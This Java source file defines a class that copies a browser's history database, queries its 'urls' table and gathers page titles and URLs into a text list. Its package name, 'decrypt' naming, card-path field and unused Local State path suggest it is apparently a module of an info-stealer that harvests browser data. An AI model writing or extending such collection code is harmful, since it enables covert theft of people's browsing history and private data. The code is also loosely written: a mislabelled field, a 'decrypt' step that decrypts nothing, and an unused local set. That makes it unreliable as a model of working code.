package _256.utils.decrypt.history;

import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.UUID;

import org.apache.commons.io.FileUtils;

public class HistoryDecrypt {

	private File CARD_PATH = null;
	private File LOCAL_STATE_PATH = null;
	public List<String> HISTORIES;

	public HistoryDecrypt(String path0, String path1) {
		this.CARD_PATH = new File(path0);
		this.LOCAL_STATE_PATH = new File(path1);
		this.HISTORIES = new ArrayList<String>();
	}

	public String getData() {
		StringBuilder temp = new StringBuilder();
		HISTORIES.stream().forEach(history -> temp.append(history + "\n"));
		return temp.toString();
	}

	public HistoryDecrypt getHistory() {
		HashSet<History> HISTORIES = new HashSet<>();
		Connection connection = null;
		File tempFile = null;
		try {
			tempFile = new File(UUID.randomUUID().toString());
			FileUtils.copyFile(this.CARD_PATH, tempFile);
			Class.forName("org.sqlite.JDBC");
			connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
			Statement statement = connection.createStatement();
			statement.setQueryTimeout(30);
			ResultSet resultSet = statement.executeQuery("SELECT * FROM urls");
			while (resultSet.next()) {
				parseHistories(tempFile, "", HISTORIES, resultSet);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		} finally {
			try {
				if (connection != null) {
					connection.close();
				}
			} catch (Exception e) {
			}
		}
		tempFile.delete();
		return this;
	}

	private void parseHistories(File historyStore, String name, HashSet<History> historySet, ResultSet resultSet) throws SQLException {
		String urlsite = resultSet.getString(2);
		String titlesite = resultSet.getString(3);
		if (urlsite != null) {
			String format = "Title: " + titlesite + "\nURL: " + urlsite + "\n";
			HISTORIES.add(format);
		}
	}
}
